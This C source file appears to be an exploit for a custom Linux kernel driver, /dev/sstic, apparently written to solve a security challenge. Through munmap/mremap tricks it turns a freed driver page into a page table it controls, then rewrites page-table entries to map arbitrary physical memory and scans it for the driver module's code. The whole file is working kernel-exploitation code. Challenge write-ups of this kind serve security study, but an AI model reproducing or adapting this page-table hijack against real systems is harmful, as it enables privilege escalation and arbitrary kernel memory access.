#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>

#include <sys/ioctl.h>
#include <assert.h>
#include "sstic.h"

#include <sys/mman.h>

#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif
 
void hexdump(void *mem, unsigned int len)
{
        unsigned int i, j;
        
        for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
        {
                /* print offset */
                if(i % HEXDUMP_COLS == 0)
                {
                        printf("0x%06x: ", i);
                }
 
                /* print hex data */
                if(i < len)
                {
                        printf("%02x ", 0xFF & ((char*)mem)[i]);
                }
                else /* end of block, just aligning for ASCII dump */
                {
                        printf("   ");
                }
                
                /* print ASCII dump */
                if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
                {
                        for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
                        {
                                if(j >= len) /* end of block, not really printing */
                                {
                                        putchar(' ');
                                }
                                else if(isprint(((char*)mem)[j])) /* printable char */
                                {
                                        putchar(0xFF & ((char*)mem)[j]);        
                                }
                                else /* other char */
                                {
                                        putchar('.');
                                }
                        }
                        putchar('\n');
                }
        }
}

unsigned int allocate_region(int fd, size_t nb_pages, int flags)
{
    union sstic_arg arg;
    arg.alloc.nb_pages = nb_pages;
    arg.alloc.flags = flags;
    int ret = ioctl(fd, ALLOC_REGION, &arg);
    if(ret == -1)
    {
        perror("allocate region");
        abort();
    }
    return arg.alloc.id;
}

void del_region(int fd, unsigned int id)
{
    union sstic_arg arg;
    arg.del.id = id;
    int ret = ioctl(fd, DEL_REGION, &arg);
    if(ret == -1)
    {
        perror("del region");
        abort();
    }
}

void assoc_region(int fd, unsigned int id, int type)
{
    union sstic_arg arg;
    arg.assoc.id = id;
    arg.assoc.type = type;
    int ret = ioctl(fd, DEL_REGION, &arg);
    if(ret == -1)
    {
        perror("assoc region");
        abort();
    }
}

void take_page_table(char **maps)
{
	uint64_t base_addr = 0x800601000;
	for(int i=1; i<10;i++)
	{
		printf("i : %d\n",i);
		uint64_t addr = base_addr + (0x200*i *0x1000); 
		char * test_map = mmap(addr, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		maps[(i-1)*2] = test_map;
		if((int64_t)test_map == -1)
		{
			perror("test_map");
		}
		*test_map = 0x45;
		printf("test_map %x\n",test_map);
		addr = base_addr + 0x200*(i) * 0x1000 + 0x1000 ;
		test_map = mmap(addr, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		maps[(i-1)*2+1] = test_map;
		if((int64_t)test_map == -1)
		{
			perror("test_map 2");
		}
		*test_map = 0x46;
		printf("test_map %x\n",test_map);
	}
}

int main()
{
    int ret;
    char *maps[100];
    int session1 = open("/dev/sstic", O_RDWR);
    /*
    unsigned int region_rd = allocate_region(session1, 3, SSTIC_RD);
    perror("region_rd");
    assert(region_rd == 0x1000);
    unsigned int region_wr = allocate_region(session1, 6, SSTIC_WR);
    assert(region_wr == 0x2000);
    unsigned int region_rd_wr = allocate_region(session1, 8, SSTIC_RD | SSTIC_WR);
    assert(region_rd_wr == 0x3000);*/
    unsigned int region_rd_wr2 = allocate_region(session1, 8, SSTIC_RD | SSTIC_WR);
    //assert(region_rd_wr2 == 0x4000);
/*
    char* map_rd = mmap(NULL, 0x3000, PROT_READ, MAP_SHARED, session1, region_rd);
    perror("test1");
    assert(map_rd != -1);
    char* map_rd2 = mmap(NULL, 0x3000, PROT_READ | PROT_WRITE, MAP_SHARED, session1, region_rd);
    assert(map_rd2 == -1);
    char *map_wr = mmap(NULL, 0x6000, PROT_WRITE, MAP_SHARED, session1, region_wr);
    assert(map_wr != -1);
    char *map_wr2 = mmap(NULL, 0x6000, PROT_WRITE | PROT_READ, MAP_SHARED, session1, region_wr);
    assert(map_wr2 == -1);
*/
    char *map_wr_rd2 = mmap(0x500001000, 0x8000, PROT_WRITE | PROT_READ, MAP_FIXED | MAP_SHARED, session1, region_rd_wr2);
    assert(map_wr_rd2 != -1);
    //printf("map : %llx\n",map_rd);
    /*
    hexdump(map_rd,0x100);
    hexdump(map_rd + 0x1000,0x10);
    hexdump(map_rd + 0x2000,0x10);*/
    //shexdump(map_rd + 0x3000,0x10);

    uint64_t base_addr = 0x800601000;
    uint64_t addr = base_addr;
    unsigned long *controlled_pte_page = NULL;
    char * test_map = mmap(addr, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if((int64_t)test_map == -1)
    {
        perror("test_map");
    }
    *test_map = 0x45;
    
    
    
    munmap(map_wr_rd2 + 0x2000,0x1000);
    
    

    ret = mremap(map_wr_rd2 + 0x3000, 0x5000, 0x5000, 3, 0x600001000);
    printf("%d\n",ret);
    if(ret == -1)
        perror("mremap");
    for(int i=0; i<5; i++)
    {
        //hexdump(0x600001000 + 0x1000 * i,0x10) ;
    }
    //hexdump(map_wr_rd2 + 0x3000,0x10);
    unsigned long new_addr = 0x600001000;
    unsigned long new_new_addr = 0x900001000;
    munmap(new_addr,0x2000);
    ret = mremap(new_addr+ 0x2000, 0x3000, 0x3000, 3, new_new_addr);
    printf("%d\n",ret);
    if(ret == -1)
        perror("mremap");

    
    char *map_wr_rd3 = mmap(0x700001000, 0x8000, PROT_WRITE | PROT_READ, MAP_FIXED | MAP_SHARED, session1, region_rd_wr2);
    *(map_wr_rd3 + 0x7000) = 0x48;
    printf("MUNMAP\n");
    sleep(1);
    munmap(new_new_addr,0x3000);
    del_region(session1,region_rd_wr2 );
take_page_table(maps);

    hexdump(map_wr_rd3 + 0x7000,0x20);
    controlled_pte_page = map_wr_rd3  + 0x7000;
    printf("pte1 : %llx, pte2: %llx\n", controlled_pte_page[1], controlled_pte_page[2]);
    unsigned long pfn1 = controlled_pte_page[1] >> 12;
    unsigned long pfn2 = controlled_pte_page[2] >> 12;
    assert(pfn2 == pfn1+1);
    for(int i=0; i<9; i++)
    {
	    printf("%hhx\n",maps[i*2][0]);
	    printf("%hhx\n",maps[i*2+1][0]);
    }
    controlled_pte_page[1] = controlled_pte_page[2];
    char * good_map = NULL;
    printf("-----\n");
    for(int i=0; i<9; i++)
    {
	    printf("%hhx\n",maps[i*2][0]);
	    printf("%hhx\n",maps[i*2+1][0]);
	    if(maps[i*2][0] == maps[i*2+1][0])
	    {
		    good_map = maps[i*2+1];
		    break;
	    }

    }
    
    hexdump(good_map,0x20); 
    hexdump(good_map-0x1000,0x20); 
    /*
    controlled_pte_page[3] = ((pfn2) << 12) | 0x67;
    hexdump(good_map+0x1000,0x20); 
    */

    char* to_find = malloc(0x800);
    int kofd = open("/lib/modules/sstic.ko",O_RDONLY);
    read(kofd, to_find, 0x800);
    printf("tofind\n");
    hexdump(to_find, 0x20);
    
    int ppfn = 0;
    int found = 0;
    char *address = 0;
    while(!found)
    {
	    for(int i=0; i<0x180; i++)
	    {
		    controlled_pte_page[3+i] = ((ppfn + i) << 12) | 0x67;
		    printf("--\n");
			    printf("pfn %x\n",ppfn+i);
		    hexdump(good_map + 0x1000*(i+1),0x20); 
		    if(!memcmp(good_map + 0x1000*(i+1), to_find + 0x80, 0x20))
		    {
			    found=ppfn+i;
			    address = good_map + 0x1000*(i+1);
			    break;
		    }
	    }
	    char * test_map3 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	    *test_map3 = 0x80;
	    munmap(test_map3,0x1000);
	    ppfn += 0x180;
	    
    }
    printf("FOUND pfn : %x\n",found);
    hexdump(address, 0x200);
    for(int i=0; i<0x600; i++)
    {
	    if(address[i] != to_find[i+0x80])
	    {
		    printf("%x\n",i);
	    }
    }


    

    sleep(100);
  

}
